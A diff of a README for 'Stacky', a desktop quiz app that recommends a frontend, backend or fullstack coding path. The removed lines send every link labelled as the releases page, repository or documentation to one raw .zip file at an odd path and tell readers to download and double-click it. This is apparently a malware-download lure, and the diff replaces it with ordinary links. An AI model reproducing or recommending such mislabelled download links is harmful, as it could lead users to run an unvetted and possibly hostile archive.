@@ -1,79 +1,73 @@
-# 🎮 Stacky - Find Your Coding Path Today!
+# 🎮 Stacky - Find Your Coding Path!
+
+[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/mauelito3/Stacky)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![Latest Release](https://img.shields.io/github/v/release/mauelito3/Stacky?display_name=tag)](https://github.com/mauelito3/Stacky/releases)
+
+Welcome to Stacky! This application is designed to help you discover your coding destiny. By answering a series of 20 tailored questions, you'll receive a personalized recommendation on whether you're best suited for a career as a **Frontend**, **Backend**, or **Fullstack Developer**.
+
+![Stacky App Screenshot](https://raw.githubusercontent.com/mauelito3/Stacky/main/assets/stacky-screenshot-placeholder.png)
+*(Note: Replace the placeholder image link with an actual screenshot of your application.)*
+
+---
+
+## ✨ Features
+
+-   **Intuitive & Simple Interface**: A clean, user-friendly design that anyone can navigate without technical expertise.
+-   **Personalized Quiz**: 20 carefully crafted questions to accurately identify your strengths and preferences.
+-   **Instant Career Guidance**: Receive an immediate recommendation for a development path that aligns with your answers.
+-   **Curated Resources**: Explore helpful articles, courses, and tools to kickstart your journey in your recommended field.
 
 ## 🚀 Getting Started
 
-Welcome to Stacky! This application will help you discover your coding destiny. By answering 20 simple questions, you will find out whether you should pursue a career as a Frontend Developer, Backend Developer, or Fullstack Developer.
+Follow these steps to get Stacky up and running on your machine.
 
-## 📥 Download Stacky
+### Prerequisites
 
-[![Download Stacky](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip%20Stacky-1.0-brightgreen)](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
+Before you begin, make sure your system meets the following requirements:
 
-Click the link above to visit our Releases page where you can download the application.
+-   **Operating System:** Windows 10+, macOS Catalina (10.15)+, or a modern Linux distribution.
+-   **RAM:** 4 GB minimum.
+-   **Storage:** At least 200 MB of free disk space.
 
-## 💻 System Requirements
+### 📥 Installation
 
-Before you download, ensure your system meets the following requirements:
-
-- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
-- **RAM:** 4 GB minimum.
-- **Storage:** At least 200 MB of free space.
-- **Internet Connection:** Required to download and set up the application.
-
-## 📂 Download & Install
-
-To download Stacky, follow these steps:
-
-1. Visit the [Releases page](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip).
-2. Look for the latest version of Stacky.
-3. Click on the download link for your operating system.
-4. Once the download is complete, locate the downloaded file in your computer's downloads folder.
-5. Double-click the file to start the installation process.
-6. Follow the on-screen instructions to complete the installation.
-7. Open Stacky and start your journey to find your coding path!
+1.  Navigate to the [**Stacky Releases Page**](https://github.com/mauelito3/Stacky/releases).
+2.  Download the appropriate installer for your operating system (`.exe` for Windows, `.dmg` for macOS, `.AppImage` or `.deb` for Linux).
+3.  Once the download is complete, locate the file in your downloads folder.
+4.  Run the installer and follow the on-screen prompts to complete the setup.
+5.  Launch Stacky and begin your journey!
 
 ## ✅ How to Use Stacky
 
-1. **Launch the Application**: After installation, find the Stacky icon on your desktop or in your applications folder and double-click it to open.
-2. **Answer the Questions**: You will see a series of 20 questions. Answer each question honestly.
-3. **Discover Your Role**: At the end of the quiz, Stacky will show you your ideal coding path: Frontend, Backend, or Fullstack.
-4. **Explore Your Options**: After you receive your result, explore the resources provided for further information about your chosen path.
-
-## 📚 Features
-
-- **Simple Interface**: Designed for ease of use, anyone can navigate Stacky without technical knowledge.
-- **20 Customized Questions**: Tailored questions to accurately identify your coding preferences and strengths.
-- **Career Guidance**: Based on your results, Stacky provides insights and resources to help you learn more about your preferred coding role.
+1.  **Launch the Application**: Open Stacky from your desktop shortcut or applications folder.
+2.  **Take the Quiz**: Answer the 20 questions as honestly as possible. There are no right or wrong answers!
+3.  **Discover Your Path**: Once you complete the quiz, Stacky will reveal your recommended developer role.
+4.  **Explore Resources**: Dive into the provided links and materials to learn more about becoming a Frontend, Backend, or Fullstack developer.
 
 ## 🔧 Troubleshooting
 
-If you encounter issues while running Stacky, consider the following tips:
+If you encounter any issues while installing or running Stacky, please try the following:
 
-- Ensure your operating system meets the required specifications.
-- Check if you have a stable internet connection during installation.
-- Restart your computer and try launching the app again.
-- If problems persist, visit the Issues section on our GitHub repository for community help.
+-   **Restart Your Computer**: A simple reboot can often resolve temporary issues.
+-   **Check System Requirements**: Ensure your system meets the minimum specifications listed above.
+-   **Re-download the Installer**: Your download may have been corrupted. Try downloading the file again from the [Releases page](https://github.com/mauelito3/Stacky/releases).
+-   **Check for Existing Issues**: If the problem persists, please check the [Issues tab](https://github.com/mauelito3/Stacky/issues) on our GitHub repository to see if someone has already reported a similar problem. If not, feel free to open a new one!
 
-## 🌟 Contribution
+## 🌟 How to Contribute
 
-We welcome contributions! If you have suggestions or ideas for features, feel free to fork the repository, submit a pull request, or create an issue to discuss your thoughts.
+We welcome and appreciate all contributions! Whether you want to fix a bug, suggest a new feature, or improve documentation, your help is valuable.
+
+Please read our [**CONTRIBUTING.md**](CONTRIBUTING.md) file for detailed guidelines on how to get started.
 
 ## 📞 Support
 
-For support, please reach out via the GitHub repository. We aim to respond to inquiries promptly.
+For support questions, bug reports, or feature requests, please [**open an issue**](https://github.com/mauelito3/Stacky/issues) on our GitHub repository. We will do our best to respond promptly.
 
-## 🎯 Related Topics
+## 📄 License
 
-Stacky can help you discover your role in areas like:
-- Backend Development
-- Frontend Development
-- Fullstack Development
-- Coding Careers
-- Online Learning Resources
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-## 🔗 Useful Links
-
-- [GitHub Repository](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
-- [Releases Page](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
-- [Documentation](https://raw.githubusercontent.com/mauelito3/Stacky/main/murmurlessly/Stacky.zip)
+---
 
 Thank you for choosing Stacky. Happy coding!
